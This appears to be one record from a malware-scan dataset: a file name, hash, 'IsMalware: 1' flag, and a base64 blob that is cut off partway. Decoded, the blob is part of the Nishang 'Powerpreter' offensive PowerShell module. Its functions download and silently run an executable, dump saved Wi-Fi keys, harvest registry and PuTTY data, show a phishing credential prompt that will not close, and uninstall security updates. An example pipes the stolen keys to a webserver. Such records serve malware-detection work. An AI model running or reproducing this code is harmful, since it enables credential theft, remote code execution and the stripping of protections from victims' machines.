Powerpreter.psm1,c59322b0845b140b94097c56276701b9,Scan result is 32768. IsMalware: 1,w6/Cu8K/PCMKLlNZTk9QU0lTClBvd2VycHJldGVyIGlzIGEgbW9kdWxlIHdyaXR0ZW4gaW4gcG93ZXJzaGVsbC4gUG93ZXJwcmV0ZXIgbWFrZXMgYXZhaWxhYmxlIG1heGltdW0gcG9zc2libGUgZnVuY3Rpb25hbGl0eSBvZiBuaXNoYW5nCmluIGEgc2luZ2xlIHNjcmlwdC4gVGhpcyBpcyBtdWNoIGhlbHBmdWwgaW4gc2NlbmFyaW9zIGxpa2UgcGhpc2hpbmcgYXR0YWNrcyBhbmQgd2Vic2hlbGxzLgoKLkRFU0NSSVBUSU9OClBvd2VycHJldGVyIGlzIGEgc2NyaXB0IG1vZHVsZSB3aGljaCBtYWtlcyBpdCB1c2VmdWwgaW4gc2NlbmFyaW9zIGxpa2UgZHJpdmUtYnktZG93bmxvYWQsIGRvY3VtZW50IGF0dGFjaG1lbnRzLCB3ZWJzaGVsbHMgZXRjLiB3aGVyZSBvbmUKbWF5IGxpa2UgdG8gcHVsbCBhbGwgdGhlIGZ1bmN0aW9uYWxpdHkgaW4gTmlzaGFuZyBpbiBhIHNpbmdsZSBmaWxlIG9yIGRlcGxveW1lbnQgaXMgbm90IGVhc3kgdG8gZG8uIFBvd2VycHJldGVyIGhhcyBwZXJzaXN0ZW5jZQpjYXBhYmlsaXRpZXMgdG9vLiBTZWUgZXhhbXBsZXMgZm9yIGhlbHAgaW4gdXNpbmcgaXQuCgouRVhBTVBMRQpQUyA+IEltcG9ydC1Nb2R1bGUgLlxQb3dlcnByZXRlci5wc20xClBTPiBHZXQtQ29tbWFuZCAtTW9kdWxlIHBvd2VycHJldGVyCgpUaGUgZmlyc3QgY29tbWFuZCBpbXBvcnRzIHRoZSBtb2R1bGUgaW4gY3VycmVudCBwb3dlcnNoZWxsIHNlc3Npb24uIElnbm9yZSB0aGUgVW5hcHByb3ZlZCB2ZXJicyB3YXJuaW5nLgpUaGUgc2Vjb25kIGNvbW1hbmQgbGlzdHMgYWxsIHRoZSBmdW5jdGlvbnMgYXZhaWxhYmxlIHdpdGggcG93ZXJwcmV0ZXIuCgouRVhBTVBMRQpQUyA+IEltcG9ydC1Nb2R1bGUgLlxQb3dlcnByZXRlci5wc20xOyBFbmFibGUtRHVwbGljYXRlVG9rZW47IEdldC1MU0FTZWNyZXQKClVzZSBhYm92ZSBjb21tYW5kIHRvIGltcG9ydCBwb3dlcnByZXRlciBpbiBjdXJyZW50IHBvd2Vyc2hlbGwgc2Vzc2lvbiBhbmQgZXhlY3V0ZSB0aGUgdHdvIGZ1bmN0aW9ucy4KCi5FWEFNUExFClBTID4gSW1wb3J0LU1vZHVsZSAuXFBvd2VycHJldGVyLnBzbTE7IFBlcnNpc3RlbmNlCgpVc2UgYWJvdmUgZm9yIHJlYm9vdCBwZXJzaXN0ZW5jZQoKLkVYQU1QTEUKUFMgPiBJbXBvcnQtTW9kdWxlIC5cUG93ZXJwcmV0ZXIucHNtMQpQUyA+IEdldC1XTEFOLUtleXMgfCBEby1FeGZpbHRyYXRpb24gLUV4ZmlsT3B0aW9uIFdlYnNlcnZlciAtVVJMIGh0dHA6Ly8xOTIuMTY4LjI1NC4xODMvY2F0Y2hwb3N0LnBocAoKVXNlIGFib3ZlIGZvciBleGZpbHRyYXRpb24gdG8gYSB3ZWJzZXJ2ZXIgd2hpY2ggbG9ncyBQT1NUIHJlcXVlc3RzLgoKCi5MSU5LCmh0dHA6Ly9sYWJvZmFwZW5ldHJhdGlvbnRlc3Rlci5jb20vCmh0dHBzOi8vZ2l0aHViLmNvbS9zYW1yYXRhc2hvay9uaXNoYW5nCgoKIz4KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjRG93bmxvYWQgYSBmaWxlIHRvIHRoZSB0YXJnZXQuIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCmZ1bmN0aW9uIERvd25sb2FkCnsKCjwjCi5TWU5PUFNJUwpQYXlsb2FkIHRvIERvd25sb2FkIGEgZmlsZSBpbiBjdXJyZW50IHVzZXJzIHRlbXAgZGlyZWN0b3J5LgoKLkRFU0NSSVBUSU9OClRoaXMgcGF5bG9hZCBkb3dubG9hZHMgYSBmaWxlIHRvIHRoZSBnaXZlbiBsb2NhdGlvbi4KCi5QQVJBTUVURVIgVVJMClRoZSBVUkwgZnJvbSB3aGVyZSB0aGUgZmlsZSB3b3VsZCBiZSBkb3dubG9hZGVkLgoKLlBBUkFNRVRFUiBGaWxlTmFtZQpOYW1lIG9mIHRoZSBmaWxlIHdoZXJlIGRvd25sb2FkIHdvdWxkIGJlIHNhdmVkLgoKLkVYQU1QTEUKUFMgPiBEb3dubG9hZCBodHRwOi8vZXhhbXBsZS5jb20vZmlsZS50eHQgbmV3ZmlsZS50eHQKCi5MSU5LCmh0dHA6Ly9sYWJvZmFwZW5ldHJhdGlvbnRlc3Rlci5jb20vCmh0dHBzOi8vZ2l0aHViLmNvbS9zYW1yYXRhc2hvay9uaXNoYW5nCiM+CgoKICAgIFtDbWRsZXRCaW5kaW5nKCldIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkVVJMLAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRmlsZU5hbWUKICAgICkKICAgICR3ZWJjbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50CiAgICAkZmlsZSA9ICIkZW52OnRlbXBcJEZpbGVOYW1lIgogICAgJHdlYmNsaWVudC5Eb3dubG9hZEZpbGUoJFVSTCwkZmlsZSkKfQoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjRG93bmxvYWQgYW4gZXhlY3V0YWJsZSBpbiB0ZXh0IGZvcm1hdCwgY29udmVydCBpdCB0byBleGUgYW5kIGV4ZWN1dGUgaXQuIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCmZ1bmN0aW9uIERvd25sb2FkX0V4ZWN1dGUKewoKPCMKLlNZTk9QU0lTClBheWxvYWQgdG8gZG93bmxvYWQgYW4gZXhlY3V0YWJsZSBpbiB0ZXh0IGZvcm1hdCwgY29udmVydCBpdCB0byBleGVjdXRhYmxlIGFuZCBleGVjdXRlLgoKLkRFU0NSSVBUSU9OClRoaXMgcGF5bG9hZCBkb3dubG9hZHMgYW4gZXhlY3V0YWJsZSBpbiB0ZXh0IGZvcm1hdCwgY29udmVydHMgaXQgdG8gZXhlY3V0YWJsZSBhbmQgZXhlY3V0ZS4KVXNlIGV4ZXRvdGV4dC5wczEgc2NyaXB0IHRvIGNoYW5nZSBhbiBleGVjdXRhYmxlIHRvIHRleHQKCi5QQVJBTUVURVIgVVJMClRoZSBVUkwgZnJvbSB3aGVyZSB0aGUgZmlsZSB3b3VsZCBiZSBkb3dubG9hZGVkLgoKLkVYQU1QTEUKUFMgPiBEb3dubG9hZF9FeGVjdXRlIGh0dHA6Ly9leGFtcGxlLmNvbS9maWxlLnR4dAoKLkxJTksKaHR0cDovL2xhYm9mYXBlbmV0cmF0aW9udGVzdGVyLmNvbS8KaHR0cHM6Ly9naXRodWIuY29tL3NhbXJhdGFzaG9rL25pc2hhbmcKIz4KCgoKICAgIFtDbWRsZXRCaW5kaW5nKCldIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkVVJMCiAgICApCiAgICAkd2ViY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudAogICAgW3N0cmluZ10kaGV4Zm9ybWF0ID0gJHdlYkNsaWVudC5Eb3dubG9hZFN0cmluZygkVVJMKSAKICAgIFtCeXRlW11dICR0ZW1wID0gJGhleGZvcm1hdCAtc3BsaXQgJyAnIAogICAgW1N5c3RlbS5JTy5GaWxlXTo6V3JpdGVBbGxCeXRlcygiJGVudjp0ZW1wXHN2Y21vbmRyLmV4ZSIsICR0ZW1wKSAKICAgIHN0YXJ0LXByb2Nlc3MgLW5vbmV3d2luZG93ICIkZW52OnRlbXBcc3ZjbW9uZHIuZXhlIiAKfQoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyNEdW1wcyBrZXlzIGluIGNsZWFyIHRleHQgZm9yIHNhdmVkIFdMQU4gcHJvZmlsZXMuIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKZnVuY3Rpb24gR2V0LVdsYW4tS2V5cyAKewoKPCMKLlNZTk9QU0lTClBheWxvYWQgd2hpY2ggZHVtcHMga2V5cyBmb3IgV0xBTiBwcm9maWxlcy4KCi5ERVNDUklQVElPTgpUaGlzIHBheWxvYWQgZHVtcHMga2V5cyBpbiBjbGVhciB0ZXh0IGZvciBzYXZlZCBXTEFOIHByb2ZpbGVzLgpUaGUgcGF5bG9hZCBtdXN0IGJlIHJ1biBmcm9tIGFzIGFkbWluaXN0cmF0b3IgdG8gZ2V0IHRoZSBrZXlzLgoKLkVYQU1QTEUKUFMgPiBHZXQtV0xBTi1LZXlzCgouTElOSwpodHRwOi8vcG9zaGNvZGUub3JnLzE3MDAKaHR0cHM6Ly9naXRodWIuY29tL3NhbXJhdGFzaG9rL25pc2hhbmcKIz4KCgogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtICgpCiAgICAkd2xhbnMgPSBuZXRzaCB3bGFuIHNob3cgcHJvZmlsZXMgfCBTZWxlY3QtU3RyaW5nIC1QYXR0ZXJuICJBbGwgVXNlciBQcm9maWxlIiB8IEZvcmVhY2gtT2JqZWN0IHskXy5Ub1N0cmluZygpfQogICAgJGV4cG9ydGRhdGEgPSAkd2xhbnMgfCBGb3JlYWNoLU9iamVjdCB7JF8uUmVwbGFjZSgiICAgIEFsbCBVc2VyIFByb2ZpbGUgICAgIDogIiwkbnVsbCl9CiAgICAkcGFzdGV2YWx1ZSA9ICRleHBvcnRkYXRhIHwgRm9yRWFjaC1PYmplY3Qge25ldHNoIHdsYW4gc2hvdyBwcm9maWxlcyBuYW1lPSIkXyIga2V5PWNsZWFyfQogICAgJHBhc3RldmFsdWUKfQoKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyNHYXRoZXJzIGp1aWN5IGluZm9ybWF0aW9uIGZyb20gdGhlIHRhcmdldCMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKZnVuY3Rpb24gR2V0LUluZm9ybWF0aW9uIAp7CgoKPCMKLlNZTk9QU0lTClBheWxvYWQgd2hpY2ggZ2F0aGVycyBqdWljeSBpbmZvcm1hdGlvbiBmcm9tIHRoZSB0YXJnZXQuCgouREVTQ1JJUFRJT04KVGhpcyBwYXlsb2FkIGV4dHJhY3RzIGluZm9ybWF0aW9uIGZvcm0gcmVnaXN0cnkgYW5kIHNvbWUgY29tbWFuZHMuIFRoZSBpbmZvcm1hdGlvbiBhdmFpbGFibGUgd291bGQgYmUgZGVwZW5kZW50IG9uIHRoZSBwcml2aWxlZ2Ugd2l0aAp3aGljaCB0aGUgc2NyaXB0IHdvdWxkIGJlIGV4ZWN1dGVkLgoKLkVYQU1QTEUKUFMgPiBHZXQtSW5mb3JtYXRpb24KCi5MSU5LCmh0dHA6Ly9sYWJvZmFwZW5ldHJhdGlvbnRlc3Rlci5jb20vCmh0dHBzOi8vZ2l0aHViLmNvbS9zYW1yYXRhc2hvay9uaXNoYW5nCiM+CgogICAgZnVuY3Rpb24gcmVnaXN0cnlfdmFsdWVzKCRyZWdrZXksICRyZWd2YWx1ZSwkY2hpbGQpIAogICAgeyAKICAgICAgICBpZiAoJGNoaWxkIC1lcSAibm8iKXska2V5ID0gZ2V0LWl0ZW0gJHJlZ2tleX0gCiAgICAgICAgZWxzZXska2V5ID0gZ2V0LWNoaWxkaXRlbSAkcmVna2V5fSAKICAgICAgICAka2V5IHwgCiAgICAgICAgRm9yRWFjaC1PYmplY3QgeyAKICAgICAgICAgICAgJHZhbHVlcyA9IEdldC1JdGVtUHJvcGVydHkgJF8uUFNQYXRoIAogICAgICAgICAgICBGb3JFYWNoICgkdmFsdWUgaW4gJF8uUHJvcGVydHkpIAogICAgICAgICAgICB7IAogICAgICAgICAgICAgICAgaWYgKCRyZWd2YWx1ZSAtZXEgImFsbCIpIHskdmFsdWVzLiR2YWx1ZX0gCiAgICAgICAgICAgICAgICBlbHNlaWYgKCRyZWd2YWx1ZSAtZXEgImFsbG5hbWUiKXskdmFsdWV9IAogICAgICAgICAgICAgICAgZWxzZSB7JHZhbHVlcy4kcmVndmFsdWU7YnJlYWt9IAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfSAKICAgIAogICAgJG91dHB1dCA9ICJMb2dnZWQgaW4gdXNlcnM6YG4iICsgKChyZWdpc3RyeV92YWx1ZXMgImhrbG06XHNvZnR3YXJlXG1pY3Jvc29mdFx3aW5kb3dzIG50XGN1cnJlbnR2ZXJzaW9uXHByb2ZpbGVsaXN0IiAicHJvZmlsZWltYWdlcGF0aCIpIC1qb2luICJgcmBuIikgCiAgICAkb3V0cHV0ID0gJG91dHB1dCArICJgbmBuIFBvd2Vyc2hlbGwgZW52aXJvbm1lbnQ6YG4iICsgKChyZWdpc3RyeV92YWx1ZXMgImhrbG06XHNvZnR3YXJlXG1pY3Jvc29mdFxwb3dlcnNoZWxsIiAiYWxsbmFtZSIpICAtam9pbiAiYHJgbiIpIAogICAgJG91dHB1dCA9ICRvdXRwdXQgKyAiYG5gbiBQdXR0eSB0cnVzdGVkIGhvc3RzOmBuIiArICgocmVnaXN0cnlfdmFsdWVzICJoa2N1Olxzb2Z0d2FyZVxzaW1vbnRhdGhhbVxwdXR0eSIgImFsbG5hbWUiKSAgLWpvaW4gImByYG4iKSAKICAgICRvdXRwdXQgPSAkb3V0cHV0ICsgImBuYG4gUHV0dHkgc2F2ZWQgc2Vzc2lvbnM6YG4iICsgKChyZWdpc3RyeV92YWx1ZXMgImhrY3U6XHNvZnR3YXJlXHNpbW9udGF0aGFtXHB1dHR5XHNlc3Npb25zIiAiYWxsIikgIC1qb2luICJgcmBuIikgCiAgICAkb3V0cHV0ID0gJG91dHB1dCArICJgbmBuIFJlY2VudGx5IHVzZWQgY29tbWFuZHM6YG4iICsgKChyZWdpc3RyeV92YWx1ZXMgImhrY3U6XHNvZnR3YXJlXG1pY3Jvc29mdFx3aW5kb3dzXGN1cnJlbnR2ZXJzaW9uXGV4cGxvcmVyXHJ1bm1ydSIgImFsbCIgIm5vIikgIC1qb2luICJgcmBuIikgCiAgICAkb3V0cHV0ID0gJG91dHB1dCArICJgbmBuIFNoYXJlcyBvbiB0aGUgbWFjaGluZTpgbiIgKyAoKHJlZ2lzdHJ5X3ZhbHVlcyAiaGtsbTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XHNlcnZpY2VzXExhbm1hblNlcnZlclxTaGFyZXMiICJhbGwiICJubyIpICAtam9pbiAiYHJgbiIpIAogICAgJG91dHB1dCA9ICRvdXRwdXQgKyAiYG5gbiBFbnZpcm9ubWVudCB2YXJpYWJsZXM6YG4iICsgKChyZWdpc3RyeV92YWx1ZXMgImhrbG06XFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxDb250cm9sXFNlc3Npb24gTWFuYWdlclxFbnZpcm9ubWVudCIgImFsbCIgIm5vIikgIC1qb2luICJgcmBuIikgCiAgICAkb3V0cHV0ID0gJG91dHB1dCArICJgbmBuIE1vcmUgZGV0YWlscyBmb3IgY3VycmVudCB1c2VyOmBuIiArICgocmVnaXN0cnlfdmFsdWVzICJoa2N1OlxWb2xhdGlsZSBFbnZpcm9ubWVudCIgImFsbCIgIm5vIikgIC1qb2luICJgcmBuIikgCiAgICAkb3V0cHV0ID0gJG91dHB1dCArICJgbmBuIFNOTVAgY29tbXVuaXR5IHN0cmluZ3M6YG4iICsgKChyZWdpc3RyeV92YWx1ZXMgImhrbG06XFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxzZXJ2aWNlc1xzbm1wXHBhcmFtZXRlcnNcdmFsaWRjb21tdW5pdGllcyIgImFsbCIgIm5vIikgIC1qb2luICJgcmBuIikgCiAgICAkb3V0cHV0ID0gJG91dHB1dCArICJgbmBuIFNOTVAgY29tbXVuaXR5IHN0cmluZ3MgZm9yIGN1cnJlbnQgdXNlcjpgbiIgKyAoKHJlZ2lzdHJ5X3ZhbHVlcyAiaGtjdTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XHNlcnZpY2VzXHNubXBccGFyYW1ldGVyc1x2YWxpZGNvbW11bml0aWVzIiAiYWxsIiAibm8iKSAgLWpvaW4gImByYG4iKSAKICAgICRvdXRwdXQgPSAkb3V0cHV0ICsgImBuYG4gSW5zdGFsbGVkIEFwcGxpY2F0aW9uczpgbiIgKyAoKHJlZ2lzdHJ5X3ZhbHVlcyAiaGtsbTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsIiAiZGlzcGxheW5hbWUiKSAgLWpvaW4gImByYG4iKSAKICAgICRvdXRwdXQgPSAkb3V0cHV0ICsgImBuYG4gSW5zdGFsbGVkIEFwcGxpY2F0aW9ucyBmb3IgY3VycmVudCB1c2VyOmBuIiArICgocmVnaXN0cnlfdmFsdWVzICJoa2N1OlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGwiICJkaXNwbGF5bmFtZSIpICAtam9pbiAiYHJgbiIpIAogICAgJG91dHB1dCA9ICRvdXRwdXQgKyAiYG5gbiBEb21haW4gTmFtZTpgbiIgKyAoKHJlZ2lzdHJ5X3ZhbHVlcyAiaGtsbTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cR3JvdXAgUG9saWN5XEhpc3RvcnlcIiAiYWxsIiAibm8iKSAgLWpvaW4gImByYG4iKSAKICAgICRvdXRwdXQgPSAkb3V0cHV0ICsgImBuYG4gQ29udGVudHMgb2YgL2V0Yy9ob3N0czpgbiIgKyAoKGdldC1jb250ZW50IC1wYXRoICJDOlx3aW5kb3dzXFN5c3RlbTMyXGRyaXZlcnNcZXRjXGhvc3RzIikgIC1qb2luICJgcmBuIikgCiAgICAkb3V0cHV0ID0gJG91dHB1dCArICJgbmBuIFJ1bm5pbmcgU2VydmljZXM6YG4iICsgKChuZXQgc3RhcnQpIC1qb2luICJgcmBuIikgCiAgICAkb3V0cHV0ID0gJG91dHB1dCArICJgbmBuIEFjY291bnQgUG9saWN5OmBuIiArICgobmV0IGFjY291bnRzKSAgLWpvaW4gImByYG4iKSAKICAgICRvdXRwdXQgPSAkb3V0cHV0ICsgImBuYG4gTG9jYWwgdXNlcnM6YG4iICsgKChuZXQgdXNlcikgIC1qb2luICJgcmBuIikgCiAgICAkb3V0cHV0ID0gJG91dHB1dCArICJgbmBuIExvY2FsIEdyb3VwczpgbiIgKyAoKG5ldCBsb2NhbGdyb3VwKSAgLWpvaW4gImByYG4iKSAKICAgICRvdXRwdXQgPSAkb3V0cHV0ICsgImBuYG4gV0xBTiBJbmZvOmBuIiArICgobmV0c2ggd2xhbiBzaG93IGFsbCkgIC1qb2luICJgcmBuIikgCiAgICAKICAgICRvdXRwdXQKCn0KCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyNEaXNwbGF5cyBhIGNyZWRlbnRpYWwgcHJvbXB0IGFuZCBkb2Vzbid0IGdvIGF3YXkgdGlsbCB2YWxpZCBjcmVkZW50aWFscyBhcmUgZW50ZXJlZCMjIyMjIyMjIyMjIyMjIyMjIwoKZnVuY3Rpb24gSW52b2tlLUNyZWRlbnRpYWxzUGhpc2gKewo8IwouU1lOT1BTSVMKRnVuY3Rpb24gd2hpY2ggb3BlbnMgYSB1c2VyIGNyZWRlbnRpYWwgcHJvbXB0LgoKLkRFU0NSSVBUSU9OClRoaXMgcGF5bG9hZCBvcGVucyBhIHByb21wdCB3aGljaCBhc2tzIGZvciB1c2VyIGNyZWRlbnRpYWxzIGFuZApkb2VzIG5vdCBnbyBhd2F5IHRpbGwgdmFsaWQgY3JlZGVudGlhbHMgYXJlIGVudGVyZWQgaW4gdGhlIHByb21wdC4KCgouRVhBTVBMRQpQUyA+IEludm9rZS1DcmVkZW50aWFsc1BoaXNoCgouTElOSwpodHRwOi8vbGFib2ZhcGVuZXRyYXRpb250ZXN0ZXIuYmxvZ3Nwb3QuY29tLwpodHRwczovL2dpdGh1Yi5jb20vc2FtcmF0YXNob2svbmlzaGFuZwojPgoKW0NtZGxldEJpbmRpbmcoKV0KUGFyYW0gKCkKCiAgICAkRXJyb3JBY3Rpb25QcmVmZXJlbmNlPSJTaWxlbnRseUNvbnRpbnVlIgogICAgQWRkLVR5cGUgLWFzc2VtYmx5bmFtZSBzeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuYWNjb3VudG1hbmFnZW1lbnQgCiAgICAkRFMgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5QcmluY2lwYWxDb250ZXh0KFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQuQ29udGV4dFR5cGVdOjpNYWNoaW5lKQogICAgJGRvbWFpbkROID0gIkxEQVA6Ly8iICsgKFtBRFNJXSIiKS5kaXN0aW5ndWlzaGVkTmFtZQogICAgd2hpbGUoJHRydWUpCiAgICB7CiAgICAgICAgJGNyZWRlbnRpYWwgPSAkaG9zdC51aS5Qcm9tcHRGb3JDcmVkZW50aWFsKCJDcmVkZW50aWFscyBhcmUgcmVxdWlyZWQgdG8gcGVyZm9ybSB0aGlzIG9wZXJhdGlvbiIsICJQbGVhc2UgZW50ZXIgeW91ciB1c2VyIG5hbWUgYW5kIHBhc3N3b3JkLiIsICIiLCAiIikKICAgICAgICBpZigkY3JlZGVudGlhbCkKICAgICAgICB7CiAgICAgICAgICAgICRjcmVkcyA9ICRjcmVkZW50aWFsLkdldE5ldHdvcmtDcmVkZW50aWFsKCkKICAgICAgICAgICAgW1N0cmluZ10kdXNlciA9ICRjcmVkcy51c2VybmFtZQogICAgICAgICAgICBbU3RyaW5nXSRwYXNzID0gJGNyZWRzLnBhc3N3b3JkCiAgICAgICAgICAgIFtTdHJpbmddJGRvbWFpbiA9ICRjcmVkcy5kb21haW4KICAgICAgICAgICAgJGF1dGhsb2NhbCA9ICREUy5WYWxpZGF0ZUNyZWRlbnRpYWxzKCR1c2VyLCAkcGFzcykKICAgICAgICAgICAgJGF1dGhkb21haW4gPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlFbnRyeSgkZG9tYWluRE4sJHVzZXIsJHBhc3MpCiAgICAgICAgICAgIGlmKCgkYXV0aGxvY2FsIC1lcSAkdHJ1ZSkgLW9yICgkYXV0aGRvbWFpbi5uYW1lIC1uZSAkbnVsbCkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRvdXRwdXQgPSAiVXNlcm5hbWU6ICIgKyAkdXNlciArICIgUGFzc3dvcmQ6ICIgKyAkcGFzcyArICIgRG9tYWluOiIgKyAkZG9tYWluICsgIiBEb21haW46IisgJGF1dGhkb21haW4ubmFtZQogICAgICAgICAgICAgICAgJG91dHB1dAogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKCgoKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI1NpbGVudGx5IHJlbW92ZXMgdXBkYXRlcyBmb3IgYSB0YXJnZXQgbWFjaGluZS4jIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojIyNUaGFua3MgVHJldm9yIFN1bGxpdmFuCiMjI2h0dHA6Ly90cmV2b3JzdWxsaXZhbi5uZXQvMjAxMS8wNS8zMS9wb3dlcnNoZWxsLXJlbW92aW5nLXNvZnR3YXJlLXVwZGF0ZXMtZnJvbS13aW5kb3dzLwpmdW5jdGlvbiBSZW1vdmUtVXBkYXRlIHsKCjwjCi5TWU5PUFNJUwpQYXlsb2FkIHdoaWNoIHNpbGVudGx5IHJlbW92ZXMgdXBkYXRlcyBmb3IgYSB0YXJnZXQgbWFjaGluZS4KCi5ERVNDUklQVElPTgpUaGlzIHBheWxvYWQgcmVtb3ZlcyB1cGRhdGVzIGZyb20gYSB0YWdyZXQgbWFjaGluZS4gVGhpcyBjb3VsZCBiZSAKdXNlZCB0byByZW1vdmUgYWxsIHVwZGF0ZXMsIGFsbCBzZWN1cml0eSB1cGRhdGVzIG9yIGEgcGFydGljdWxhciB1cGRhdGUuCgouUEFSQU1FVEVSIEtCSUQKVEhFIEtCSUQgb2YgdXBkYXRlIHlvdSB3YW50IHRvIHJlbW92ZS4gQWxsIGFuZCBTZWN1cml0eSBhcmUgYWxzbyB2YWxpZGQuCgouRVhBTVBMRQpQUyA+IFJlbW92ZS1VcGRhdGUgQWxsClRoaXMgcmVtb3ZlcyBhbGwgdXBkYXRlcyBmcm9tIHRoZSB0YXJnZXQuCgouRVhBTVBMRQpQUyA+IFJlbW92ZS1VcGRhdGUgU2VjdXJpdHkKVGhpcyByZW1vdmVzIGFsbCBzZWN1cml0eSB1cGRhdGVzIGZyb20gdGhlIHRhcmdldC4KCi5FWEFNUExFClBTID4gUmVtb3ZlLVVwZGF0ZSBLQjI3NjEyMjYKVGhpcyByZW1vdmVzIEtCMjc2MTIyNiBmcm9tIHRoZSB0YXJnZXQuCgouTElOSwpodHRwOi8vdHJldm9yc3VsbGl2YW4ubmV0LzIwMTEvMDUvMzEvcG93ZXJzaGVsbC1yZW1vdmluZy1zb2Z0d2FyZS11cGRhdGVzLWZyb20td2luZG93cy8KaHR0cHM6Ly9naXRodWIuY29tL3NhbXJhdGFzaG9rL25pc2hhbmcKIz4KCgogICAgW0NtZGxldEJpbmRpbmcoKV0gUGFyYW0oIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkS0JJRAogICAgKQogICAgJEhvdEZpeGVzID0gR2V0LUhvdEZpeAoKICAgIGZvcmVhY2ggKCRIb3RGaXggaW4gJEhvdEZpeGVzKQogICAgewoKICAgICAgICBpZiAoJEtCSUQgLWVxICRIb3RGaXguSG90Zml4SWQpCiAgICAgICAgewogICAgICAgICAgICAkS0JJRCA9ICRIb3RGaXguSG90Zml4SWQuUmVwbGFjZSgiS0IiLCAiIikgCiAgICAgICAgICAgICRSZW1vdmFsQ29tbWFuZCA9ICJ3dXNhLmV4ZSAvdW5pbnN0YWxsIC9rYjokS0JJRCAvcXVpZXQgL25vcmVzdGFydCIKICAgICAgICAgICAgV3JpdGUtSG9zdCAiUmVtb3ZpbmcgJEtCSUQgZnJvbSB0aGUgdGFyZ2V0LiIKICAgICAgICAgICAgSW52b2tlLUV4cHJlc3Npb24gJFJlbW92YWxDb21tYW5kCiAgICAgICAgICAgIGJyZWFrCiAgICAgICAgfQogICAgCiAgICAgICAgaWYgKCRLQklEIC1tYXRjaCAiQWxsIikKICAgICAgICB7CiAgICAgICAgICAgICRLQk51bWJlciA9ICRIb3RGaXguSG90Zml4SWQuUmVwbGFjZSgiS0IiLCAiIikKICAgICAgICAgICAgJFJlbW92YWxDb21tYW5kID0gInd1c2EuZXhlIC91bmluc3RhbGwgL2tiOiRLQk51bWJlciAvcXVpZXQgL25vcmVzdGFydCIKICAgICAgICAgICAgV3JpdGUtSG9zdCAiUmVtb3ZpbmcgdXBkYXRlICRLQk51bWJlciBmcm9tIHRoZSB0YXJnZXQuIgogICAgICAgICAgICBJbnZva2UtRXhwcmVzc2lvbiAkUmVtb3ZhbENvbW1hbmQKICAgICAgICAKICAgICAgICB9CiAgICAKICAgICAgICBpZiAoJEtCSUQgLW1hdGNoICJTZWN1cml0eSIpCiAgICAgICAgewogICAgICAgICAgICBpZiAoJEhvdEZpeC5EZXNjcmlwdGlvbiAtbWF0Y2ggIlNlY3VyaXR5IikKICAgICAgICAgICAgewogICAgICAgIAogICAgICAgICAgICAgICAgJEtCU2VjdXJpdHkgPSAkSG90Rml4LkhvdGZpeElkLlJlcGxhY2UoIktCIiwgIiIpCiAgICAgICAgICAgICAgICAkUmVtb3ZhbENvbW1hbmQgPSAid3VzYS5leGUgL3VuaW5zdGFsbCAva2I6JEtCU2VjdXJpdHkgL3F1aWV0IC9ub3Jlc3RhcnQiCiAgICAgICAgICAgICAgICBXcml0ZS1Ib3N0ICJSZW1vdmluZyBTZWN1cml0eSBVcGRhdGUgJEtCU2VjdXJpdHkgZnJvbSB0aGUgdGFyZ2V0LiIKICAgICAgICAgICAgICAgIEludm9rZS1Fe